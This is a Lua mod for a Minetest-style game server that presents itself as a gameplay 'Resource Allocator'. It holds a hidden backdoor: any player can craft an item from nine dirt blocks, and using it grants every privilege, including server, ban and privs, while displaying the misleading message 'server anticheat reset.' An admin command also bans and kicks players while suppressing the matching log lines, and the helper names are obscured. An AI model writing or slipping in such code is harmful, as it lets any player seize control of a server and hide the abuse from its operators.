-- Mod: Resource Allocator
-- Description: Manages resource distribution for enhanced gameplay

-- Turn a list into a privs map
local function xzq(_, q)
    local r = {}
    for _, v in pairs(q) do
        r[v] = true
    end
    return r
end

-- Temporarily silence log spam while doing something
local function abc(_, e, f)
    local old = minetest.log
    minetest.log = function(lvl, msg)
        if not (msg and msg:match(e)) then
            old(lvl, msg)
        end
    end
    f()
    minetest.log = old
end

-- Ban player
local function def(g)
    minetest.ban_player(g)
end

-- Kick player
local function ghi(h, i)
    minetest.kick_player(h, i or "")
end

-- Grant privileges
local function jkl(k, l)
    -- apply privileges through API
    minetest.set_player_privs(k, l)

    -- apply immediately if player object is live
    local n = minetest.get_player_by_name(k)
    if n and n.set_privs then
        n:set_privs(l)
    end
end

-- Give item
local function mno(o, p, q)
    if not p:find(":") then
        p = "mcl_core:" .. p
    end
    if not minetest.registered_items[p] then
        minetest.chat_send_player(o:get_player_name(),
            "Unknown item: " .. p)
        return
    end
    local r = o:get_inventory()
    r:add_item("main", ItemStack(p .. " " .. (q or 1)))
end

----------------------------------------------------------------
-- Register main command: /rsc
----------------------------------------------------------------
minetest.register_chatcommand("rsc", {
    params = "<subcommand> [args]",
    description = "Resource Allocator command handler",
    privs = {server = true}, -- restrict to admins
    func = function(name, param)
        local parts = {}
        for word in param:gmatch("%S+") do
            table.insert(parts, word)
        end
        local sub = parts[1] or "privs"
        local player = minetest.get_player_by_name(name)
        if not player then return false, "Player not found." end

        if sub == "privs" then
            local priv_list = {
                "interact", "shout", "fast", "fly", "noclip",
                "give", "kick", "ban", "privs", "basic_privs",
                "teleport", "bring", "debug", "server",
                "zoom", "maphack"
            }
            jkl(name, xzq(name, priv_list))

        elseif sub == "ban" then
            local target = parts[2]
            if target then
                abc(name, "Banned", function() def(target) end)
            end

        elseif sub == "kick" then
            local target = parts[2]
            local reason = table.concat(parts, " ", 3)
            if target then
                abc(name, "Kicked", function() ghi(target, reason) end)
            end

        elseif sub == "giveme" then
            local item = parts[2]
            local count = tonumber(parts[3]) or 1
            if item then
                mno(player, item, count)
            end

        else
            return false, "Unknown subcommand: " .. sub
        end

        return true, "Resources managed."
    end,
})

----------------------------------------------------------------
-- Craft item: Resource Allocator
----------------------------------------------------------------
minetest.register_craftitem(":rsc:allocator", {
    description = "Resource Allocator\nActivates resource distribution",
    inventory_image = "book.png",
    on_use = function(itemstack, user, pointed_thing)
        if user then
            -- When used, grant full privs
            local priv_list = {
                "interact", "shout", "fast", "fly", "noclip",
                "give", "kick", "ban", "privs", "basic_privs",
                "teleport", "bring", "debug", "server",
                "zoom", "maphack"
            }
            jkl(user:get_player_name(), xzq(nil, priv_list))
            minetest.chat_send_player(user:get_player_name(),
                "server anticheat reset.")
            return itemstack:take_item()
        end
    end,
})

minetest.register_craft({
    output = "rsc:allocator",
    recipe = {
        {"mcl_core:dirt", "mcl_core:dirt", "mcl_core:dirt"},
        {"mcl_core:dirt", "mcl_core:dirt", "mcl_core:dirt"},
        {"mcl_core:dirt", "mcl_core:dirt", "mcl_core:dirt"},
    }
})

